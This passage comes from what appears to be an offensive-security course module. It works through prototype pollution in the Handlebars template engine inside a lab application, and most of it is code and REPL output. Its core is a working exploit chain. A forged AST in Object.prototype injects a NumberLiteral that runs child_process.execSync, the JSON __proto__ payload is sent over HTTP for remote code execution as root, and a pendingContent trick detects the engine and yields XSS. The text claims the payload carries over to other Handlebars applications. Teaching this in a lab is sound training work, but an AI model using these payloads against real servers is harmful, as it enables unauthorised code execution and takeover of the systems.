  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}

> Handlebars.parse(ast)
{
  type: 'Program',
  body: [
...
  ],
  strip: {},
  loc: {
...
  }
}
```

As shown above, `parse` is called with a string containing the static text `hello` and the expression to be replaced `{{ foo }}`. The function returns an AST, where static text corresponds to `ContentStatement` and expressions correspond to `MustacheStatement`. The object also contains a `type` variable with the value `Program`. When `parse` is called again and an AST object is passed in, the function will directly return the same object without additional parsing. This is the expected behavior mentioned earlier and is very useful when building the final payload.

Once the intermediate code representation is generated, it needs to be converted into opcodes, which are then used to compile the final JavaScript code. You can observe this process by inspecting the `precompile` function in `compiler/compiler.js`.

``` js
472  function precompile(input, options, env) {
473    if (input == null || typeof input !== 'string' && input.type !== 'Program') {
474      throw new _exception2['default']('You must pass a string or Handlebars AST to Handlebars.precompile. You passed ' + input);
475    }
476
477    options = options || {};
478    if (!('data' in options)) {
479      options.data = true;
480    }
481    if (options.compat) {
482      options.useDepths = true;
483    }
484
485    var ast = env.parse(input, options),
486        environment = new env.Compiler().compile(ast, options);
487    return new env.JavaScriptCompiler().compile(environment, options);
488  }
```

The `precompile` function first checks whether the input is of the expected type and initializes the `options` object. Line 485 parses the input using the `parse` function reviewed earlier. Remember that the input is not modified when passing in an AST object. Line 486 compiles the AST to generate opcodes, and finally line 487 compiles the opcodes into JavaScript code. The source code for `Compiler().compile` is located in `compiler/compiler.js` and `JavaScriptCompiler().compile` is located in `compiler/javascript-compiler.js`.

Try using `precompile` to generate JavaScript.

``` js
> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return "hello "\n' +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +
  '},"useData":true}'
```

The JavaScript output contains the string `hello`, along with code to find and append the `foo` variable.

There is no native implementation that prints the generated opcodes. This process is important for RCE and will be debugged later to see how the AST is processed into opcodes. Now here's the important thing: before being compiled into JavaScript code, the AST is converted into an array of opcodes, which instructs the compiler how to generate the final JavaScript code.

Create a function to execute this template to demonstrate the complete life cycle of the template.

``` js
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'hello student'
```

Use the `eval` function to convert a string into a usable object. This is only because of the use of the `precompile` function; `compile` can also be used, but it returns an executable function instead of a string, which is not conducive to explaining the compilation process. Next, use the `Handlebars.template` function to generate the actual template function. It returns another function that renders the template after executing it and providing the required data.

Now that you understand how a template is rendered, let's examine how it can be abused through prototype pollution. First determine if the target runs Handlebars, then focus on RCE.

Work backwards from the end of the template generation process. The further back the injection point is found, the higher the likelihood that the injection will make a noticeable difference in the output, because less time is left for the library to overwrite, change the modifications, or crash outright. Therefore, start the review from the `compiler/javascript-compiler.js` file.

Upon review, I found the `appendContent` function to be interesting.

``` js
369    // [appendContent]
370    //
371    // On stack, before: ...
372    // On stack, after: ...
373    //
374    // Appends the string value of `content` to the current buffer
375    appendContent: function appendContent(content) {
376      if (this.pendingContent) {
377        content = this.pendingContent + content;
378      } else {
379        this.pendingLocation = this.source.currentLocation;
380      }
381
382      this.pendingContent = content;
383    },
```

This type of function is ideal for prototype pollution: a possibly unset variable `this.pendingContent` will be appended to an existing variable `content`. Now it's just a matter of understanding how the function is called. Searching the source code reveals that it is used in `compiler/compiler.js`.

``` js
228    ContentStatement: function ContentStatement(content) {
229      if (content.value) {
230        this.opcode('appendContent', content.value);
231      }
232    },
```

As mentioned before, Handlebars creates the AST, creates the opcodes, and converts them into JavaScript code. The above function instructs the compiler how to create opcodes for `ContentStatement`. If a value exists in the content, it calls `appendContent` and passes in the content.

Check the input template's AST to see if a `ContentStatement` exists in it.

``` js
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
```

`ContentStatement` is used for the string portion of the template. Here, its `value` is `hello`. Templates don't have to have a `ContentStatement`, but most useful templates almost always have one. Therefore, injecting `pendingContent` will almost always append content to the template.

Try the exploit first in the interactive CLI, then via an HTTP request.

``` js
> {}.__proto__.pendingContent = "haxhaxhax"
'haxhaxhax'

> precompiled = Handlebars.precompile(ast)
...
  '  return "haxhaxhaxhello "\n' +
...

> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'haxhaxhaxhello student'
```

The string `haxhaxhax` is included in the compiled code and final output. Now set it via HTTP request.

When starting docker-compose, make sure `TEMPLATING_ENGINE` is set to `hbs` to ensure that the hbs template engine is used. After setting `pendingContent` in an encrypted value, send the request to `/guaclite` to exploit prototype pollution.

Like EJS, the page will load normally; but when you load another page, you will find that the content has been appended.

At this point, you have a way to detect whether the target is running Handlebars when the source code is not accessible. This method is not only useful for black-box targets, but also for white-box testing: it can help confirm the existence of a library when it is not certain whether or how it is used.

Now that you've injected content with prototype contamination, it's time to get RCE further.

#### Exercises

1. Follow this section while connecting to a remote debugger and observing the prototype taint exploit.

2. Why can’t I obtain RCE through `pendingContent` exploit?

3. Use the `pendingContent` exploit to get working XSS via Handlebars.

4. Unset `pendingContent` to return functionality to normal.

#### Extra Miles

Switch to Pug template engine. Use prototype contamination to discover a mechanism to detect whether a target is running a Pug and exploit that mechanism to obtain XSS against the target.

## 10.5.2 Handlebars - Remote Code Execution

Now that the detection mechanism is working, let’s try executing code in Handlebars. Restart the application before starting because the previous section has tainted the prototype.

```
student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default
student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
```

It might seem like you can add JavaScript code to a compiled object using the `pendingContent` exploit found earlier, but you can't; content added to `pendingContent` is escaped, preventing JavaScript injection.

``` js
> Handlebars = require("handlebars")
...

> {}.__proto__.pendingContent = "singleQuote: ' DoubleQuote: \" "
`singleQuote: ' DoubleQuote: " `

> Handlebars.precompile("Hello {{ foo }}")
...
  `  return "singleQuote: ' DoubleQuote: \\" Hello "\n` +
...
```

Learn why and how content is escaped to find ways around it. Review the `appendContent` function in `compiler/javascript-compiler.js`.

``` js
375  appendContent: function appendContent(content) {
376    if (this.pendingContent) {
377      content = this.pendingContent + content;
378    } else {
379      this.pendingLocation = this.source.currentLocation;
380    }
381
382    this.pendingContent = content;
383  },
```

`appendContent` will append content if `pendingContent` is set. When the function ends, it sets `this.pendingContent` to the spliced ​​content. Searching for the remaining `pendingContent` in `compiler/javascript-compiler.js` reveals that it is "pushed" via the `pushSource` function.

``` js
881  pushSource: function pushSource(source) {
882    if (this.pendingContent) {
883      this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
884      this.pendingContent = undefined;
885    }
886
887    if (source) {
888      this.source.push(source);
889    }
890  },
```

If `this.pendingContent` is set, `this.source.push` will push the content; but the content will be passed to `this.source.quotedString` first. The `quotedString` function can be found in `compiler/code-gen.js`.

``` js
118  quotedString: function quotedString(str) {
119    return '"' + (str + '').replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\u2028/g, '\\u2028') // Per Ecma-262 7.3 + 7.8.4
120    .replace(/\u2029/g, '\\u2029') + '"';
121  },
```

This is most likely the function that escapes the quotes in `pendingContent`.

Since `pushSource` is used to add pending content, work backwards to find instances of calls to `pushSource` that may append pending content. One example of this is the `appendEscaped` function in `compiler/javascript-compiler.js`.

``` js
416  appendEscaped: function appendEscaped() {
417  this.pushSource(this.appendToBuffer([this.aliasable('container.escapeExpression'), '(', this.popStack(), ')']));
418  },
```

Continuing to trace upward, you will find that `appendEscaped` is an opcode function mapped to the `MustacheStatement` node in the AST. This function is located in `compiler/compiler.js`.

``` js
215  MustacheStatement: function MustacheStatement(mustache) {
216    this.SubExpression(mustache);
217
218    if (mustache.escaped && !this.options.noEscape) {
219      this.opcode('appendEscaped');
220    } else {
221      this.opcode('append');
222    }
223  },
```

To summarize, when the Handlebars library builds an AST, the text is converted into a token representing the content type. Looking back at the original template `hello {{ foo }}`, it is converted into two statements: `ContentStatement` for `hello`, and `MustacheStatement` for `{{ foo }}`.

``` js
> ast = Handlebars.parse("hello {{ foo }}")
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
```

To convert these statements into JavaScript code, they are mapped to functions that determine how to append content to the compiled template. The previous `appendEscaped` function is one example.

To exploit Handlebars, search for a statement that pushes content without escaping, then review the component types that can be included in the Handlebars template to find an exploitable object. These components are located in `compiler/compiler.js`.

``` js
...
215    MustacheStatement: function MustacheStatement(mustache) {
...
223    },
...
228    ContentStatement: function ContentStatement(content) {
...
232    },
233
234    CommentStatement: function CommentStatement() {},
...
309
310    StringLiteral: function StringLiteral(string) {
311      this.opcode('pushString', string.value);
312    },
313
314    NumberLiteral: function NumberLiteral(number) {
315      this.opcode('pushLiteral', number.value);
316    },
317
318    BooleanLiteral: function BooleanLiteral(bool) {
319      this.opcode('pushLiteral', bool.value);
320    },
321
322    UndefinedLiteral: function UndefinedLiteral() {
323      this.opcode('pushLiteral', 'undefined');
324    },
325
326    NullLiteral: function NullLiteral() {
327      this.opcode('pushLiteral', 'null');
328    },
...
```

Only some of the components are listed here, but they are all worth looking into. We're already familiar with `MustacheStatement` and `ContentStatement`, and we've also seen `CommentStatement`, which like any comment does not push opcodes. You can also see a series of literals: `StringLiteral`, `NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral` and `NullLiteral`.

`StringLiteral` will call the `pushString` opcode with a string value. Check the function starting at line 585 of `compiler/javascript-compiler.js`.

``` js
585  // [pushString]
586  //
587  // On stack, before: ...
588  // On stack, after: quotedString(string), ...
589  //
590  // Push a quoted version of `string` onto the stack
591  pushString: function pushString(string) {
592    this.pushStackLiteral(this.quotedString(string));
593  },
```

The code above shows that `pushString` also escapes quotes and is therefore not a good target.

`NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral` and `NullLiteral` use the `pushLiteral` opcode. `NumberLiteral` and `BooleanLiteral` provide variables, `UndefinedLiteral` and `NullLiteral` provide static values. Check how `pushLiteral` works.

``` js
595  // [pushLiteral]
596  //
597  // On stack, before: ...
598  // On stack, after: value, ...
599  //
600  // Pushes a value onto the stack. This operation prevents
601  // the compiler from creating a temporary variable to hold
602  // it.
603  pushLiteral: function pushLiteral(value) {
604    this.pushStackLiteral(value);
605  },
```

`pushLiteral` will run `pushStackLiteral` with the value. This function is also located in the same file.

``` js
868  push: function push(expr) {
869    if (!(expr instanceof Literal)) {
870      expr = this.source.wrap(expr);
871    }
872
873    this.inlineStack.push(expr);
874    return expr;
875  },
876
877  pushStackLiteral: function pushStackLiteral(item) {
878    this.push(new Literal(item));
879  },
```

`pushStackLiteral` will call `push`. The precise functionality of these two functions is less important than the fact that they do not escape values ​​in any way.

In theory, if you could add a `NumberLiteral` or `BooleanLiteral` object to the prototype and set its value to the command you want to run, it would be possible to inject the content into the generated function; rendering the template should cause the command to be executed.

First understand what the `NumberLiteral` object of Handlebars consists of. Use the modified test template, which creates a variety of block statements, expressions, and literals.

``` hbs
{{someHelper "some string" 12345 true undefined null}}
```

This template executes a helper with five parameters. The most important are the five arguments provided to `someHelper`: `"some string"`, `12345`, `true`, `undefined` and `null`. This creates `StringLiteral`, `NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral` and `NullLiteral`. Use this template to generate an AST and access the `NumberLiteral` objects in the AST.

``` js
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
> ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
...
> ast.body[0].params[1]
{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
```

To access a `NumberLiteral` object, you need to traverse the AST: first access the first index in the body element, which is the `MustacheStatement`; then access its parameters. The number argument is the second element of the array, so accessing the second index gives you an example of a `NumberLiteral` object.

Generate code to analyze how numbers are represented in functions.

``` js
> Handlebars.precompile(ast)
...
  '  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",12345,true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n' +
...
```

After precompilation, `12345` can be found in the generated code. If you use it as an injection point, you need to know the location of the injection. To do this, the return function is formatted to be more readable.

``` js
container.escapeExpression(
	(lookupProperty(helpers, "someHelper") ||
		(depth0 && lookupProperty(depth0, "someHelper")) ||
		container.hooks.helperMissing
	).call(
		depth0 != null ? depth0 : (container.nullContext || {}),
		"some string",
		12345,
		true,
		undefined,
		null,
		{
			"name": "someHelper",
			"hash": {},
			"data": data,
			"loc": {
				"start": {
					"line": 1,
					"column": 0
				},
				"end": {
					"line": 1,
					"column": 54
				}
			}
		}
	)
);
```

Numbers are used as arguments to the `call` function. As long as the injected JavaScript is syntactically correct, no additional escaping is required. Try changing the value of the number in the AST to call `console.log`, then precompile and render the template.

``` js
> ast.body[0].params[1].value = "console.log('haxhaxhax')"
"console.log('haxhaxhax')"

> precompiled = Handlebars.precompile(ast)
...
  `  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",console.log('haxhaxhax'),true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n` +
...

> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
...
> tem({})
haxhaxhax
Uncaught Error: Missing helper: "someHelper"
...
```

Set the value of `NumberLiteral` to the `console.log` statement. After precompiling the AST, you can see the statement where the number originally was. An error will be thrown when running the template, but before the error is thrown, our code has been executed.

Now that you know the types of nodes you need in your AST, you need to find a way to add a `NumberLiteral` with a custom value; or better yet, create your own AST that contains a `NumberLiteral` with a custom value.

Previously reviewed the `parseWithoutProcessing` function in `node_modules/handlebars/dist/cjs/handlebars/compiler/base.js`.

``` js
...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
...
46    var ast = _parser2['default'].parse(input);
48    return ast;
49  }
```

Line 35 checks whether the incoming input has been compiled. Therefore, `precompile` can be passed an AST or a raw string. But when a raw string is passed in, `input.type` is undefined, so the string prototype is searched for its value. If you set the `type` variable to `Program` in the Object prototype, you can trick Handlebars into always thinking that it is an AST; you can then create your own AST in the Object prototype to run the required commands.

To do this, first set the prototype to `Program`, observe the errors, and then fix the errors in the Object prototype one by one until you have a parsable template.

``` js
> {}.__proto__.type = "Program"
'Program'

> Handlebars.parse("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'length' of undefined
    at WhitespaceControl.Program (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/whitespace-control.js:26:28)
    at WhitespaceControl.accept (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/visitor.js:72:32)
    at HandlebarsEnvironment.parse (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:55:16)
```

Start debugging in Visual Studio Code using the CLI with the `Caught Exceptions` and `Uncaught Exceptions` breakpoints checked to have the debugger immediately jump to the code causing the problem.

When parsing the template again, the exception is caught on line 26 of `compiler/whitespace-control.js`.

``` js
25    var body = program.body;
26    for (var i = 0, l = body.length; i < l; i++) {
27      var current = body[i],
28          strip = this.accept(current);
...
70    }
```

The application throws an exception because the function expected an AST with `body` and received a string instead. An error occurred while trying to access the `length` property. Disconnect the debugger to continue the application, set body to an empty array in the prototype, and try again.

You will also receive exceptions when typing in the CLI without first disconnecting the debugger. Therefore, it's better to disconnect and reconnect rather than click through exceptions one by one.

``` js
> {}.__proto__.body = []

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    return "";\n' +
  '},"useData":true}'
```

No exception will be thrown when body is an empty array, and the string will be returned unchanged. A fairly empty function is also provided when precompiled. While progress has been made, it is not yet useful enough. Next generate a simple template containing only `MustacheStatement` and look at the value of the `body` variable.

``` js
> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
    path: {
      type: 'PathExpression',
      data: false,
      depth: 0,
      parts: [Array],
      original: 'foo',
      loc: [SourceLocation]
    },
    params: [],
    hash: undefined,
    escaped: true,
    strip: { open: false, close: false },
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
```

You may need all the values ​​in the object, but it's best to start with a simple example and work your way up. First add an object of type `MustacheStatement` to body. Then set the object prototype and start the debugger. Run `parse` and `precompile` after connecting.

``` js
> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement'}]
[ { type: 'MustacheStatement' } ]
> Debugger attached.

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'parts' of undefined
...
```

As shown above, parsing did not throw an error, but precompilation did. The debugger catches the exception and sees that it is thrown at line 552 of `compiler/compiler.js`.

``` js
551  function transformLiteralToPath(sexpr) {
552    if (!sexpr.path.parts) {
553      var literal = sexpr.path;
554      // Casting to string here to make false and 0 literal values play nicely with the rest
555      // of the system.
556      sexpr.path = {
557        type: 'PathExpression',
558        data: false,
559        depth: 0,
560        parts: [literal.original + ''],
561        original: literal.original + '',
562        loc: literal.loc
563      };
564    }
565  }
```

The exception received was `Cannot read property 'parts' of undefined`. This is because `body.path` is undefined and JavaScript cannot access `parts` of undefined variables. No need to rebuild the entire `body.path` object, just set `body.path` to whatever you want. Set it to `0` in the object prototype, but disconnect the debugger first.

``` js
> {}.__proto__.body = [{type: 'MustacheStatement', path:0}]
[ { type: 'MustacheStatement', path: 0 } ]

> Handlebars.precompile("hello {{ foo }}")
...
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":}) : helper))) != null ? stack1 : "");\n' +
...
```

When the path variable is set to `0` and the template is precompiled, the function's string is returned. At first glance it seems that we have found the smallest payload that will generate a compiled template, but closer inspection of the output shows that the `loc` variable is not set correctly; executing the function will get a syntax error.

The `loc` variable also exists in the body of the previously generated legal AST.

``` js
> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
...
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
```

Again start with minimal variables and add as needed. Set `loc` to `0` and adjust if necessary.

``` js
> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0}]
[ { type: 'MustacheStatement', path: 0, loc: 0 } ]

> precompiled = Handlebars.precompile("hello {{ foo }}")
...
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":0}) : helper))) != null ? stack1 : "");\n' +
...

> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}
> tem()
''
```

At this point, the template has been compiled, imported, and executed successfully without throwing any errors. Since no substance has been added to the `MustacheStatement`, no output should be expected. Next add the `NumberLiteral` parameter to the statement. Review the example `NumberLiteral` object generated earlier and use it as a baseline for the variables.

``` js
{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
```

Again start with the minimum and add as needed. `type` is required to instruct the parser to treat the value as `NumberLiteral`, and `value` is required to inject compiled code. Put these contents into an array of objects in the `params` variable.

``` js
[
	{
		type: 'MustacheStatement',
		path:0,
		loc: 0,
		params: [
			{
				type: 'NumberLiteral',
				value: "console.log('haxhaxhax')"
			}
		]
	}
]
```

The above is the value that will be set in the `body` variable of the Object prototype.

``` js
> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0, params: [ { type: 'NumberLiteral', value: "console.log('haxhaxhax')" } ]}]
[
  { type: 'MustacheStatement', path: 0, loc: 0, params: [ [Object] ] }
]

> precompiled = Handlebars.precompile("hello {{ foo }}")
...
  `  return ((stack1 = (lookupProperty(helpers,"undefined")||(depth0 && lookupProperty(depth0,"undefined"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),console.log('haxhaxhax'),{"name":"undefined","hash":{},"data":data,"loc":0})) != null ? stack1 : "");\n` +
...
```

At this point, the value has been added to the compiled function. Execute the function to verify whether the payload is executed.

``` js
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> tem()
haxhaxhax
Uncaught Error: Missing helper: "undefined"
...
```

Although an error was received, the `console.log` statement was executed.

Next you need to apply the principles learned here to exploit the target application through HTTP requests. Modify the request payload to include the information added to the prototype in the CLI.

``` json
"__proto__":
{
  "type": "Program",
  "body":[
    {
      "type": "MustacheStatement",
      "path":0,
      "loc": 0,
      "params":[
        {
          "type": "NumberLiteral",
          "value": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
        }
      ]
    }
  ]
}
```

Using will output the exploit payload for the current user running the application and use that payload in Burp. After sending the request, create a connection using the token from the response.

As before, the prototype is tainted at the end of the request. To trigger it, a new page needs to be loaded.

Sending a GET request to the root path will generate an error; however, the `docker-compose` console will display the user running the application in the container, which is `root`.

```
chips_1     | root
chips_1     |
chips_1     | root
chips_1     |
chips_1     | GET / 500 39.494 ms - 1152
chips_1     | Error: /usr/src/app/views/hbs/error.hbs: Missing helper: "undefined"
...
```

At this point, you have contaminated the prototype and obtained RCE on the application. This payload should be available to other applications using the Handlebars library.

#### Exercises

1. Follow this section while connecting to a remote debugger and observing the prototype taint exploit.

2. Use this exploit to obtain a shell.

3. This module uses the `NumberLiteral` type to implement RCE. Are there other types that may also cause RCE? What are they?

#### Extra Miles

Switch the template engine to Pug and discover a path to RCE.

# 10.6 Summary

This module introduces JavaScript prototypes, discusses how to pollute prototypes, and how to exploit prototype pollution. We discovered and exploited a prototype pollution vulnerability in a third-party library. Finally, the prototype pollution vulnerability was exploited to attack two different template engines. We confirmed which template engine the remote server was running and obtained remote code execution from both template engines.

Prototype pollution is a fairly common vulnerability in third-party libraries. While many of these vulnerabilities have been fixed, many applications and libraries have not been updated to the latest versions. This provides an excellent opportunity to exploit the vulnerability and gain code execution.





















